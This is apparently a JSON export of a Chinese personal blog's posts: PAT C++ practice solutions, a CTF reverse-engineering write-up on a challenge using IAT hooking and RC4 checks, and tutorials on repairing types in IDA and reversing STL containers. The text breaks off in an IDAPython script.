然后大佬给出的方案是用long long 类型进行小数点后移×1000，这里其实就要考虑所给的数据是否都是最多小数点后三位了 #include&lt;iostream&gt; using namespace std; int main(void)&#123; int n; long long sum = 0; double tmp; cin &gt;&gt; n; for(int i=0;i&lt;n;i++)&#123; cin &gt;&gt; tmp; sum += (long long)(tmp * 1000) * (i + 1) * (n - i); &#125; printf(&quot;%.2f&quot;,sum/1000.0); return 0; &#125; 然后这里居然才4.99 更离谱的是给通过了😂笑死，反正我感觉很不靠谱 其实我觉得这题用java中的bigdecimal才是最优 动态规划类解法：(从后往前遍历) #include&lt;iostream&gt; using namespace std; int main(void)&#123; int n; double tmp; long long sum = 0; cin &gt;&gt; n; long long seq[n]; for(int i=0;i&lt;n;i++) &#123; cin &gt;&gt; tmp; seq[i] = (long long)(tmp * 1000); &#125; sum = seq[n-1]; for(int i=n - 2;i !=-1 ;i--)&#123; seq[i] = seq[i] * (n - i ) + seq[i+1]; sum += seq[i]; &#125; printf(&quot;%.2f&quot;,sum/1000.0); return 0; &#125;","categories":[{"name":"PAT练习","slug":"PAT练习","permalink":"https://pa1r0t.github.io/categories/PAT%E7%BB%83%E4%B9%A0/"}],"tags":[]},{"title":"奇奇怪怪的错误","slug":"奇奇怪怪的错误","date":"2023-05-09T02:30:44.000Z","updated":"2024-06-25T13:31:33.793Z","comments":true,"path":"2023/05/09/奇奇怪怪的错误/","link":"","permalink":"https://pa1r0t.github.io/2023/05/09/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%94%99%E8%AF%AF/","excerpt":"PAT乙级第二天记录——反转链表（纯数组解）","text":"PAT乙级第二天记录——反转链表（纯数组解） 第一题给定一个常数 K 以及一个单链表 L，请编写程序将 L 中每 K 个结点反转。例如：给定 L 为 1→2→3→4→5→6，K 为 3，则输出应该为 3→2→1→6→5→4；如果 K 为 4，则输出应该为 4→3→2→1→5→6，即最后不到 K 个元素不反转。 输入格式：每个输入包含 1 个测试用例。每个测试用例第 1 行给出第 1 个结点的地址、结点总个数正整数 N (≤105)、以及正整数 K (≤N)，即要求反转的子链结点的个数。结点的地址是 5 位非负整数，NULL 地址用 −1 表示。 接下来有 N 行，每行格式为： Address Data Next 其中 Address 是结点地址，Data 是该结点保存的整数数据，Next 是下一结点的地址。 输出格式：对每个测试用例，顺序输出反转后的链表，其上每个结点占一行，格式与输入相同。 输入样例：00100 6 4 00000 4 99999 00100 1 12309 68237 6 -1 33218 3 00000 99999 5 68237 12309 2 33218 输出样例：00000 4 33218 33218 3 12309 12309 2 00100 00100 1 99999 99999 5 68237 68237 6 -1 奇奇怪怪的错误 后面发现是我main函数return 1 搜了网友的回答：shell返回值非0是程序退出异常，说明你的代码抛出了异常。 soga！！！ 首先这题并没有用到链表结构而是用几个容量大的数组把数据存起来，存起来之后再用一个数组把节点地址线性存起来，节点下一个地址就是下一个位置的值，太妙了😁！！！反转的话直接在地址上反转就行丝毫不影响数据之间的变化。 原本我的代码： #include&lt;iostream&gt; #include&lt;algorithm&gt; using namespace std; int main(void)&#123; int first,N,K,tmp; int next[100000],data[100000],list[100000]; cin &gt;&gt; first &gt;&gt; N &gt;&gt; K; for(int i=0;i&lt;N;i++)&#123; cin &gt;&gt; tmp; cin &gt;&gt; data[tmp] &gt;&gt; next[tmp]; &#125; int sum = 0; // 不是所有节点都在链上 //用list数组构造链表 for(int i=0;first != -1;i++)&#123; list[sum++] = first; first = next[first]; &#125; //反转链表 for(int i=0;i&lt;sum-i*K;i+=K)&#123; reverse(begin(list)+i,begin(list)+i+K); &#125; for(int i=0;i&lt;sum-1;i++)&#123; printf(&quot;%05d %d %05d\\n&quot;,list[i],data[list[i]],list[i+1]); &#125; printf(&quot;%05d %d -1&quot;,list[sum-1],data[list[sum-1]]); return 0; &#125; 这里的错误主要是【i&lt;sum-i*K】。 我真是脑残，i的值是会变的呀，只能说我写的时候思维好不严谨😢 修改后： #include&lt;iostream&gt; #include&lt;algorithm&gt; using namespace std; int main(void)&#123; int first,N,K,tmp; int next[100000],data[100000],list[100000]; cin &gt;&gt; first &gt;&gt; N &gt;&gt; K; for(int i=0;i&lt;N;i++)&#123; cin &gt;&gt; tmp; cin &gt;&gt; data[tmp] &gt;&gt; next[tmp]; &#125; int sum = 0; // 不是所有节点都在链上 //用list数组构造链表 for(int i=0;first != -1;i++)&#123; list[sum++] = first; first = next[first]; &#125; //反转链表 for(int i=0;i&lt;=sum - sum % K;i+=K)&#123; reverse(begin(list)+i,begin(list)+i+K); &#125; for(int i=0;i&lt;sum-1;i++)&#123; printf(&quot;%05d %d %05d\\n&quot;,list[i],data[list[i]],list[i+1]); &#125; printf(&quot;%05d %d -1&quot;,list[sum-1],data[list[sum-1]]); return 1; &#125; 第二题让我们定义dn为：dn&#x3D;pn+1−pn，其中p*i是第i个素数。显然有d*1&#x3D;1，且对于n&gt;1有*dn*是偶数。“素数对猜想”认为“存在无穷多对相邻且差为2的素数。 现给定任意正整数N(&lt;105)，请计算不超过N的满足猜想的素数对的个数。 输入格式:输入在一行给出正整数N。 输出格式:在一行中输出不超过N的满足猜想的素数对的个数。 输入样例:20 输出样例:4 这题显然是素数问题，写个判断素数就行，差为2的话少于5的都是0个，大于5才有素数对； 这里柳神判断素数是i * i &lt;= n,这样都不用考虑用开平方的函数了 代码： #include&lt;iostream&gt; using namespace std; int isprime(int n)&#123; for(int i=2;i * i &lt;= n;i++)&#123; if(n % i == 0)&#123; return 0; &#125; &#125; return 1; &#125; int main(void)&#123; int n,cnt = 0; cin &gt;&gt; n; for(int i=5;i&lt;=n;i+=2)&#123; if(isprime(i) &amp;&amp; isprime(i-2)) cnt++; &#125; cout &lt;&lt; cnt; &#125; 第二题On a broken keyboard, some of the keys are worn out. So when you type some sentences, the characters corresponding to those keys will not appear on screen. Now given a string that you are supposed to type, and the string that you actually type out, please list those keys which are for sure worn out. Input Specification:Each input file contains one test case. For each case, the 1st line contains the original string, and the 2nd line contains the typed-out string. Each string contains no more than 80 characters which are either English letters [A-Z] (case insensitive), digital numbers [0-9], or _ (representing the space). It is guaranteed that both strings are non-empty. Output Specification:For each test case, print in one line the keys that are worn out, in the order of being detected. The English letters must be capitalized. Each worn out key must be printed once only. It is guaranteed that there is at least one worn out key. Sample Input:7_This_is_a_test _hs_s_a_es Sample Output:7TI 这是一道甲级题，但是非常简单，题目大意就是找不完整的字母，然后用大写字母输出，但是每个大写字母只输出一次。 用c++中string的find函数即可，string::npos是没有找到的意思。 #include&lt;iostream&gt; #include&lt;cctype&gt; using namespace std; int main(void)&#123; string s1,s2,ans; cin &gt;&gt; s1 &gt;&gt; s2; for(int i=0;i&lt;s1.length();i++)&#123; if(s2.find(s1[i]) == string::npos &amp;&amp; ans.find(toupper(s1[i])) == string::npos)&#123; ans += toupper(s1[i]); &#125; &#125; cout &lt;&lt; ans; return 0; &#125;","categories":[{"name":"PAT练习","slug":"PAT练习","permalink":"https://pa1r0t.github.io/categories/PAT%E7%BB%83%E4%B9%A0/"}],"tags":[]},{"title":"pat乙级第二天记录","slug":"pat乙级第二天记录","date":"2023-05-08T05:31:53.000Z","updated":"2024-06-25T13:41:57.586Z","comments":true,"path":"2023/05/08/pat乙级第二天记录/","link":"","permalink":"https://pa1r0t.github.io/2023/05/08/pat%E4%B9%99%E7%BA%A7%E7%AC%AC%E4%BA%8C%E5%A4%A9%E8%AE%B0%E5%BD%95/","excerpt":"记录一些写代码上的小细节","text":"记录一些写代码上的小细节 题目一读入 n（&gt;0）名学生的姓名、学号、成绩，分别输出成绩最高和成绩最低学生的姓名和学号。 输入格式：每个测试输入包含 1 个测试用例，格式为 第 1 行：正整数 n 第 2 行：第 1 个学生的姓名 学号 成绩 第 3 行：第 2 个学生的姓名 学号 成绩 ... ... ... 第 n+1 行：第 n 个学生的姓名 学号 成绩 其中姓名和学号均为不超过 10 个字符的字符串，成绩为 0 到 100 之间的一个整数，这里保证在一组测试用例中没有两个学生的成绩是相同的。 输出格式：对每个测试用例输出 2 行，第 1 行是成绩最高学生的姓名和学号，第 2 行是成绩最低学生的姓名和学号，字符串间有 1 空格。 输入样例：3 Joe Math990112 89 Mike CS991301 100 Mary EE990830 95 输出样例：Mike CS991301 Joe Math990112 这一题我其实想将学生信息用三个字符串来同时存各种信息，奈何c++切割字符串方面并没有python方便，所以我也老老实实空间换时间了，不过程序逻辑还真算是简单了 #include&lt;iostream&gt; using namespace std; int main(void)&#123; int n,max_s = -1,min_s = 101,score; string max_name,min_name,max_num,min_num,tmp_name,tmp_num; cin &gt;&gt; n; for(int i=0;i&lt;n;i++)&#123; cin &gt;&gt; tmp_name &gt;&gt; tmp_num &gt;&gt; score; if(score &gt; max_s)&#123; max_s = score; max_name = tmp_name; max_num = tmp_num;&#125; if(score &lt; min_s)&#123; min_s = score; min_name = tmp_name; min_num = tmp_num;&#125; &#125; cout &lt;&lt; max_name &lt;&lt; &quot; &quot; &lt;&lt; max_num &lt;&lt; endl; cout &lt;&lt; min_name &lt;&lt; &quot; &quot; &lt;&lt; min_num; &#125; 题目二卡拉兹(Callatz)猜想： 对任何一个正整数 n，如果它是偶数，那么把它砍掉一半；如果它是奇数，那么把 (3n+1) 砍掉一半。这样一直反复砍下去，最后一定在某一步得到 n&#x3D;1。卡拉兹在 1950 年的世界数学家大会上公布了这个猜想，传说当时耶鲁大学师生齐动员，拼命想证明这个貌似很傻很天真的命题，结果闹得学生们无心学业，一心只证 (3n+1)，以至于有人说这是一个阴谋，卡拉兹是在蓄意延缓美国数学界教学与科研的进展…… 我们今天的题目不是证明卡拉兹猜想，而是对给定的任一不超过 1000 的正整数 n，简单地数一下，需要多少步（砍几下）才能得到 n&#x3D;1？ 输入格式：每个测试输入包含 1 个测试用例，即给出正整数 n 的值。 输出格式：输出从 n 计算到 1 需要的步数。 输入样例：3 输出样例：5 我原本是这样写的： #include&lt;iostream&gt; using namespace std; int main()&#123; int n,i = 0; cin &gt;&gt; n; for(;n != 1;i++)&#123; if(n%2) n = (3*n + 1)/2; else n /= 2; &#125; cout &lt;&lt; i; &#125; 但其实这在效率上差了点，if的两两种情况都要除2。 看了柳神的解答，我们可以将两种处理运算中抽离共同运算 #include&lt;iostream&gt; using namespace std; int main()&#123; int n,i = 0; cin &gt;&gt; n; for(;n != 1;i++)&#123; if(n%2) n = (3*n + 1); n /= 2; &#125; cout &lt;&lt; i; &#125; 像这题题解也一样 for(int i=0;i&lt;tmp.size();i++)&#123; if(i!=0) cout &lt;&lt; &quot; &quot;; cout &lt;&lt; mp[tmp[i]-48]; &#125; 每一次都不一样要打印空格，但每次必须要打印数字。可以在开端或者末尾进行受限。但是在末尾的话还要再次计算tmp.size()，这样就要花销了 题目三卡拉兹(Callatz)猜想已经在1001中给出了描述。在这个题目里，情况稍微有些复杂。 当我们验证卡拉兹猜想的时候，为了避免重复计算，可以记录下递推过程中遇到的每一个数。例如对 n&#x3D;3 进行验证的时候，我们需要计算 3、5、8、4、2、1，则当我们对 n&#x3D;5、8、4、2 进行验证的时候，就可以直接判定卡拉兹猜想的真伪，而不需要重复计算，因为这 4 个数已经在验证3的时候遇到过了，我们称 5、8、4、2 是被 3“覆盖”的数。我们称一个数列中的某个数 n 为“关键数”，如果 n 不能被数列中的其他数字所覆盖。 现在给定一系列待验证的数字，我们只需要验证其中的几个关键数，就可以不必再重复验证余下的数字。你的任务就是找出这些关键数字，并按从大到小的顺序输出它们。 输入格式：每个测试输入包含 1 个测试用例，第 1 行给出一个正整数 K (&lt;100)，第 2 行给出 K 个互不相同的待验证的正整数 n (1&lt;n≤100)的值，数字间用空格隔开。 输出格式：每个测试用例的输出占一行，按从大到小的顺序输出关键数字。数字间用 1 个空格隔开，但一行中最后一个数字后没有空格。 输入样例：6 3 5 6 7 8 11 输出样例：7 6 解答： 这里输入的数用一个数组进行存放； 然后用另外的数组arr进行记录n运算过程中出现某些数，出现过记录为1，其他为0； 然后进行存放数据的数组进行排序； 然后遍历数组，arr为0的位置输出即可 这里虽然数n小于100，但是如果是99就会×3+1，必然会大于100，这里arr数组尽可能地大 由于数组一需要排序，为了方便我们用了vector容器 这里sort用了lambda表达式，效率不知道怎么样，够帅就行哈哈 然后就是输出了，这里每次因为不一定会输出数，也不一定会输出空格，所以没有公共部分，只能用if过滤了 这里用了一个flag来记录是否输出空格，还是采用“ ”+数的形式 #include&lt;iostream&gt; #include&lt;vector&gt; #include&lt;algorithm&gt; using namespace std; int arr[100000]; int main(void)&#123; int n,tmp,k; cin &gt;&gt; k; vector&lt;int&gt; v(k); for(int i=0;i&lt;k;i++)&#123; cin &gt;&gt; n; v[i] = n; for(;n != 1;)&#123; if(n%2) n = (3*n + 1); n /= 2; if(arr[n]==1) break; arr[n] = 1; &#125; &#125; sort(v.begin(),v.end(),[](int a,int b)&#123;return a &gt; b;&#125;); for(int i=0,flag = 0;i&lt;k;i++)&#123; if(arr[v[i]] == 0) &#123; if(flag) &#123; cout &lt;&lt; &quot; &quot;;&#125; cout &lt;&lt; v[i]; flag = 1; &#125; &#125; return 0; &#125;","categories":[{"name":"PAT练习","slug":"PAT练习","permalink":"https://pa1r0t.github.io/categories/PAT%E7%BB%83%E4%B9%A0/"}],"tags":[]},{"title":"map题解字符串问题","slug":"map题解字符串问题","date":"2023-05-07T11:33:37.000Z","updated":"2024-06-25T13:39:13.869Z","comments":true,"path":"2023/05/07/map题解字符串问题/","link":"","permalink":"https://pa1r0t.github.io/2023/05/07/map%E9%A2%98%E8%A7%A3%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98/","excerpt":"PAT_basic C++ map1","text":"PAT_basic C++ map1 PAT乙级1003. 我要通过！​ 此题，题目就难以理解。不过现在理解了，题目其实我觉得条件二要在条件一的基础上理解，然后条件三要在条件二的基础上理解，然后需要给出例子进行推导，然后总结出结论——其实就是总结出公式 题目： “答案正确”是自动判题系统给出的最令人欢喜的回复。本题属于 PAT 的“答案正确”大派送 —— 只要读入的字符串满足下列条件，系统就输出“答案正确”，否则输出“答案错误”。 得到“答案正确”的条件是： 字符串中必须仅有 P、 A、 T这三种字符，不可以包含其它字符； 任意形如 xPATx 的字符串都可以获得“答案正确”，其中 x 或者是空字符串，或者是仅由字母 A 组成的字符串； 如果 aPbTc 是正确的，那么 aPbATca 也是正确的，其中 a、 b、 c 均或者是空字符串，或者是仅由字母 A 组成的字符串。 现在就请你为 PAT 写一个自动裁判程序，判定哪些字符串是可以获得“答案正确”的。 输入格式：每个测试输入包含 1 个测试用例。第 1 行给出一个正整数 n (≤10)，是需要检测的字符串个数。接下来每个字符串占一行，字符串长度不超过 100，且不包含空格。 输出格式：每个字符串的检测结果占一行，如果该字符串可以获得“答案正确”，则输出 YES，否则输出 NO。 输入样例：10 PAT PAAT AAPATAA AAPAATAAAA xPATx PT Whatever APAAATAA APT APATTAA 输出样例：YES YES YES YES NO NO NO NO NO NO 题解： #include&lt;iostream&gt; #include&lt;map&gt; using namespace std; int main(void)&#123; int n; string s; int p=-1,t=-1; cin &gt;&gt; n; for(int i=0;i&lt;n;i++)&#123; cin &gt;&gt; s; map&lt;char,int&gt; mp; //遍历字符串 for(int j=0;j&lt;s.size();j++)&#123; //记录字符数量 mp[s[j]]++; //记录P,T的位置 if(s[j] == &#39;P&#39;) p = j; if(s[j] == &#39;T&#39;) t = j; &#125; //mp[&#39;A&#39;] != 0 必须要有A字符 //mp[&#39;P&#39;] == 1 &amp;&amp; mp[&#39;T&#39;] == 1 PT字符必须要有且有一个 //t-p &gt; 1 P和T的位置满足中间一个距离，即中间必须有A //mp.size() == 3 仅有P A T //p*(t-p-1)==s.size()-t-1 前A数量 ×中间A数量 = 后A数量 if(mp[&#39;A&#39;] != 0 &amp;&amp; mp[&#39;P&#39;] == 1 &amp;&amp; mp[&#39;T&#39;] == 1 &amp;&amp; t-p != 1 &amp;&amp; mp.size() == 3 &amp;&amp; p*(t-p-1)==s.size()-t-1) printf(&quot;YES\\n&quot;); else printf(&quot;NO\\n&quot;); &#125; &#125; 这题本来是要计算字符A位置上数量约束，一个map就巧妙解决了所有约束太妙了。 申明：此题主要看柳神解答，非本人独创 参考链接：1003. 我要通过！(20)-PAT乙级真题 – 柳婼 の blog (liuchuo.net)","categories":[{"name":"PAT练习","slug":"PAT练习","permalink":"https://pa1r0t.github.io/categories/PAT%E7%BB%83%E4%B9%A0/"}],"tags":[]},{"title":"西湖论剑wp","slug":"西湖论剑wp","date":"2023-02-15T02:06:30.000Z","updated":"2024-06-25T13:59:28.827Z","comments":true,"path":"2023/02/15/西湖论剑wp/","link":"","permalink":"https://pa1r0t.github.io/2023/02/15/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/","excerpt":"西湖论剑wp","text":"西湖论剑wp BabyRE给数组中的每一个函数都设置断点 开始动调，第一个函数，给输入的值进行检验是否是数字 第二个函数进行按位取反 取反后的结果 下个函数是IAT hook .替换GetLastError函数 替换为sub_4019D0函数 GetModuleHandle函数：获取一个应用程序或动态链接库的模块句柄 GetModuleHandleA(0);返回0x00400000，而*模块句柄实际上就是模块在当前进程空间的装入地址。exe程序装入句柄一般为 0x00400000 。所以GetModuleHandle(NULL); 返回的值为 0x00400000；GetModuleHandle(“kernel32”)；返回值是0x7c800000(这个值正是kernel32.dll中的Image base的值)。* 这里lpModuleName为kernel32 然后在kernel32模块中找GetLastError函数地址再将其替换这就是hook IAT的过程：先从程序句柄0x00400000中找kernel32.dll再从kernel32中找getlasterror。刚好两个循环 这里双击也可以查看 再给替换的函数加上断点 注意dword_4085C0是IAT之后的GetLastError函数 下一个函数是替换dword_408148的值 C 库函数 int atexit(void (*func)(void)) 当程序正常终止时，调用指定的函数 func。您可以在任何地方注册你的终止函数，但它会在程序终止的时候被调用。func – 在程序终止时被调用的函数。 如果有多处atexit那么执行顺序是什么呢？ #include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; void functionA () &#123; printf(&quot;这是函数A\\n&quot;); &#125; void functionB () &#123; printf(&quot;这是函数B\\n&quot;); &#125; void functionC () &#123; printf(&quot;这是函数C\\n&quot;); &#125; int main () &#123; /* 注册终止函数 */ atexit(functionA ); printf(&quot;启动主程序...\\n&quot;); atexit(functionC ); printf(&quot;退出主程序...\\n&quot;); atexit(functionB ); return(0); &#125; 可以看出来多出atexit是以栈的执行顺序调用的 所以总结一下执行顺序 sub_401170 输入检验 -&gt; sub_401230 对某一内存数据进行按位取反 sub_4012B0 IAT hook 替换GetLastError函数 替换为sub_4019D0函数 main sub_4019D0 dword_408148, “dcbahgfelkjiponm” sub_401670 base8 加密后memcmp(&amp;unk_4081D0, a16230465152334, 0x60u); sub_4015C0 sub_401CC0加密后memcmp(Buffer, a67339fc92b4875, 0x28u); sub_4014E0 执行RC4，后比较密文memcmp(&amp;unk_4084C0, &amp;unk_408090, 0x70u) ) ebpf程序：eBPF 于 2015 年推出，是 Linux 的 一项 功能，可以直接在 Linux 内核中运行程序，而不是在无法直接访问内核资源的“用户空间”中运行程序。 eBPF 源于 BPF，本质上是处于内核中的一个高效与灵活的虚类虚拟机组件，以一种安全的方式在许多内核 Hook 点执行字节码。 资料链接： (61条消息) eBPF 入门之编程_rtoax的博客-CSDN博客_ebpf程序 (61条消息) eBPF在android上的使用_布道师Peter的博客-CSDN博客 VT是什么意思？ VT，全称是，Virtualization Technology，即是虚拟化技术，虚拟化技术可以扩大硬件的容量，简化软件的重新配置过程。CPU的虚拟化技术可以单CPU模拟多CPU并行，允许一个平台同时运行多个操作系统，并且应用程序都可以在相互独立的空间内运行而互不影响，从而显著提高计算机的工作效率。 VT实现：VT 入门番外篇——最小 VT 实现 - 寂静的羽夏 - 博客园 (cnblogs.com)","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"},{"name":"赛题复现wp","slug":"ctf/赛题复现wp","permalink":"https://pa1r0t.github.io/categories/ctf/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0wp/"}],"tags":[]},{"title":"IDA结构体分析","slug":"IDA结构体分析","date":"2023-01-21T01:52:17.000Z","updated":"2024-06-25T14:01:23.720Z","comments":true,"path":"2023/01/21/IDA结构体分析/","link":"","permalink":"https://pa1r0t.github.io/2023/01/21/IDA%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%86%E6%9E%90/","excerpt":"IDA 类型修复","text":"IDA 类型修复 源码编译成二进制代码的过程中，大量辅助信息被删除，其中最重要的就是类型信息 为什么要修复伪代码中的类型？ 提高伪代码的准确度 指导 IDA 反编译器中的优化器使用正确的优化方案 让 IDA 生成的伪代码更接近源码 我们需要手动修复哪些类型？ 函数返回值类型 参数类型 &#x2F; 局部变量类型 &#x2F; 全局变量类型 数组类型 &#x2F; 数组大小 结构体类型 虚表类型 IDA 数组修复主要有两种： 1.局部变量中定义的数组 2.全局变量中定义的数组 数组修复要考虑：数据类型 + 数组大小 IDA 修复枚举值实验材料：ptrace1 IDA 的类型数据库内置了常见的枚举（宏）的值，可以直接引入并修复。 通过逆向分析，ptrace函数 第一个参数就是ptrace函数的功能号 鼠标锁定摁M键导入枚举值 Ctrl+F5搜索ptrace关键字 找到后双击即可 下图就全部修复完成了 IDA 结构体修复实验材料：monopoly 这是一个大富翁游戏！ 确定结构体大小： 内存分配可以直接确定结构体大小 memcpy &#x2F; 局部变量偏移差 -&gt; 间接确定 （结构体&#x2F;类局部变量） 这种大多是在栈上 创建相等大小匿名结构体，并将相关变量、参数的类型修改为该结构体 这里看见这个0x70的new函数，直接在struct视图下创建结构体 快捷键是Shift + F9，打开struct视图 这里在struct视图下，右键点击增加结构体类型 这里可以看见结构体大小 鼠标光标在ends处，增加属性（大小）：摁d键 这里直到sizeof显示为0x70为止，每个属性先以dq为单位，进行存储，后续再逆向分析再进行变更 这样结构体就初步设置完成了 这里回到代码处，这里将v0的类型修改为，刚刚我们创建的结构体类型 第一种改法：摁Y键，进行类型修改为struc_1 *类型 第二种改法：摁右键，转化为其他结构体： 这里直接选择我们刚刚创建的类型即可 这里创建好之后，执行下面的函数，我们跟进去看看 这里的a1进行了一系列操作，我们将a1的类修修改为我们定义的类型 因为这个函数在new之后执行，所以可能是构造函数，这里我们改个函数名吧 在构造函数中，有些属性是进行dword操作，这里我们就要将qword，改成dword类型 比如field_48，这里双击field_48进入结构体定义处，将该属性改成dword，这里摁d键 设置好之后下面未定义的也需要改成dword，就像这样 其他变量也是一样修改，把剩下的也修改了，但是当最后一个属性改为dword后，总大小发生了改变，这里我们只需要在下面再增加一个变量即可 最后就是这样 然后在源码中摁F5，代码就好看多了 上面循环处field_4c是以4字节进行访问，并且访问5词，也就是说field_4c开始处是一个以4字节为单位的一个数组，数组大小为5，在结构体定义处，右键点array设置数组，大小为5 最终field_4c后面的变量也将合并进入数组中 源码舒服，重命名为array1 这里进行字符串的初始化和赋值操作 这里我们将field_20改为str1 根据大富翁游戏，初始化的字符串，根据名字都是一些建筑，我们可以把定义的结构体名称改成house，然后将构造函数改成init_house 然后经过构造函数，申请到的对象内存都会存放到，以A1C0为首的地址处 上面一共64个位置，所以类型为house *为类型，数组长度为64个来存放house对象的指针 这里再右键array改为64 这些建筑正好形成地图，将数组名改成map即可 分析另外一个结构体，这个结构体没有使用 new &#x2F; malloc 分配内存，如何确定大小？ 进入函数，看起来明显是个初始化函数 两个变量都是紧挨着的在内存中，属于静态分配了 两个变量位置相减为0x80，所以我们就暂时确定这个结构体的大小为0x80，然后我就去struct视图中去创建一个大小为0x80的结构体，还是老操作 这里其实可以先创建64长度的数组，然后再取消定义，这样就可以快速创建结构体了 类型定义好之后，函数外的全局变量类型不急着更改，先更改函数形参的类型 在函数中判断feild_20可能是个数组，这里先不理会 后面函数形参类型也需要一个个去修改 刷新一下变成这样了，给变量改个名 把剩余需要修改的变量大小继续更改 然后这里根据printf的字符串信息来判断结构体的类型 v6可能是建筑的类型，从map数组中取出来的结构体都是house类型了，然后把变量名都改成自己猜想的名字。 这个函数的实参是map数组元素，形参应该改为house结构体指针 这里有个field_40,不能确定是啥 我们可以用交叉引用，去别的地方找信息，刚好这里有一处 这里将ppp1赋给field_40，所以我们就将field_40改成结构体2类型 以上就是随意逆向的结果，真正正经逆向都是要分析程序逻辑的，我们先随意逆向，分析部分属性信息，有助于我们之后的分析 程序刚开始会让我们输入游戏难度等级 经过分析这个就是获取数字的函数 然后我们先从简单的easy_level开始 从这分析出ppp3是玩家的意思，因为刚开始它就给ppp3给到初始的金额了 然后进入一个循环，首先进入这个函数 这个函数很明显是个循环 有两个函数，一个只有player1另外还有player2，也就是一个人玩玩，另一个人玩 然后这里我们需要输入我们想做的内容 我们先以第一个，这里有个比较，应该是玩家资产数量 要求输入的值不能超过，玩家拥有的资产的数量。所以sub_452F函数估计就是资产的售卖了 这里售卖的函数中 这里资产数组大小为map的总个数为64个 然后是3，购买资产 分析得 最终： 全局字段交叉引用 Ctrl + alt + X （要尽可能将相关函数找出来并修复类型，有利于查找） IDA 虚表修复实验材料： vtable 虚表就是C++实现多态的一种机制 为了实现C++的多态，C++使用了一种动态绑定的技术。这个技术的核心是虚函数表，当一个类（A）继承另一个类（B）时，类A会继承类B的函数的调用权。所以如果一个基类包含了虚函数，那么其继承类也可调用这些虚函数，换句话说，一个类继承了包含虚函数的基类，那么这个类也拥有自己的虚表。我们来看以下的代码。类A包含虚函数vfunc1，vfunc2，由于类A包含虚函数，故类A拥有一个虚表。 class A &#123; public: virtual void vfunc1(); virtual void vfunc2(); void func1(); void func2(); private: int m_data1, m_data2; &#125;; 类A的虚表如图1所示: 虚表是一个指针数组，其元素是虚函数的指针，每个元素对应一个虚函数的函数指针。需要指出的是，普通的函数即非虚函数，其调用并不需要经过虚表，所以虚表的元素并不包括普通函数的函数指针。虚表内的条目，即虚函数指针的赋值发生在编译器的编译阶段，也就是说在代码的编译阶段，虚表就可以构造出来了 虚表修复主要是为了重建虚表交叉引用,一般类的第一个地址就是虚表的地址。 这里就是调用虚表的某一个函数 这里类大小为0x28字节 这里我们找到虚表，点击这个就是虚表 然后右边是虚表的符号 这里先进行构建结构体，在结构体中表示虚表，一个函数地址，在64位中为32位 创建好后，创建类结构体，然后将类结构体的第一个属性类型设置为虚表类型 然后将v3的类型设置为类结构体类型 然后就修复完成了","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"},{"name":"工具使用","slug":"re/工具使用","permalink":"https://pa1r0t.github.io/categories/re/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}],"tags":[{"name":"IDA","slug":"IDA","permalink":"https://pa1r0t.github.io/tags/IDA/"}]},{"title":"STL逆向","slug":"STL逆向","date":"2023-01-20T12:03:08.000Z","updated":"2024-06-25T14:03:19.291Z","comments":true,"path":"2023/01/20/STL逆向/","link":"","permalink":"https://pa1r0t.github.io/2023/01/20/STL%E9%80%86%E5%90%91/","excerpt":"c++ STL","text":"c++ STL STL 逆向方法论 识别 STL 容器类型 识别 STL 容器操作 提取 STL 容器中的数据 逆向 STL 主要的问题: 缺少符号，无法判断 STL 容器类型 （主要困难） STL 内部数据结构复杂，难以提取数据 优化使大量 stl 函数被 inline 方法：解析 STL 容器内存数据，从内存数据角度判断容器类型，提取容器内容判断函数操作。 常见 STL 容器序列容器 vector Deque List String 关联容器 Pair Map Set MultiMap &#x2F; MultiSet 无序关联容器:unordered_map C++ STL关联式容器是什么？此类容器在存储元素值的同时，还会为各元素额外再配备一个值（又称为“键”，其本质也是一个 C++ 基础数据类型或自定义类型的元素），它的功能是在使用关联式容器的过程中，如果已知目标元素的键的值，则直接通过该键就可以找到目标元素，而无需再通过遍历整个容器的方式。 弃用序列式容器，转而选用关联式容器存储元素，往往就是看中了关联式容器可以快速查找、读取或者删除所存储的元素，同时该类型容器插入元素的效率也比序列式容器高。 常见 STL 容器适配器容器适配器是一个封装了序列容器的类模板，它在一般序列容器的基础上提供了一些不同的功能。之所以称作适配器类，是因为它可以通过适配容器现有的接口来提供不同的功能。 其实，容器适配器中的“适配器”，和生活中常见的电源适配器中“适配器”的含义非常接近。我们知道，无论是电脑、手机还是其它电器，充电时都无法直接使用 220V 的交流电，为了方便用户使用，各个电器厂商都会提供一个适用于自己产品的电源线，它可以将 220V 的交流电转换成适合电器使用的低压直流电。 从用户的角度看，电源线扮演的角色就是将原本不适用的交流电变得适用，因此其又被称为电源适配器。 举一个例子，假设一个代码模块 A，它的构成如下所示： class A&#123; public: void f1()&#123;&#125; void f2()&#123;&#125; void f3()&#123;&#125; void f4()&#123;&#125; &#125;; 现在我们需要设计一个模板 B，但发现，其实只需要组合一下模块 A 中的 f1()、f2()、f3()，就可以实现模板 B 需要的功能。其中 f1() 单独使用即可，而 f2() 和 f3() 需要组合起来使用，如下所示： class B&#123; private: A * a; public: void g1()&#123; a-&gt;f1(); &#125; void g2()&#123; a-&gt;f2(); a-&gt;f3(); &#125; &#125;; 可以看到，就如同是电源适配器将不适用的交流电变得适用一样，模板 B 将不适合直接拿来用的模板 A 变得适用了，因此我们可以将模板 B 称为 B 适配器. 容器适配器也是同样的道理，简单的理解容器适配器，其就是将不适用的序列式容器（包括 vector、deque 和 list）变得适用。容器适配器的底层实现和模板 A、B 的关系是完全相同的，即通过封装某个序列式容器，并重新组合该容器中包含的成员函数，使其满足某些特定场景的需要。 stack（STL stack）容器适配器:采用默认的 deque 基础容器 queue容器适配器:其底层使用的基础容器选择默认的 deque 容器 priority_queue ：vector 逆向时处理容器适配器只需要用底层容器来处理即可 STL 各高级类型dump数据std::string 固定长度 32 字节，4 个 dq 第一个指针字段指向数据地址 第二个 size_t 字段存储字符串长度 内存分布： IDA dump脚本： def read_dbg_cppstr_64(objectAddr): # a easy function for read std:string # 首地址就是begin指针 strPtr = 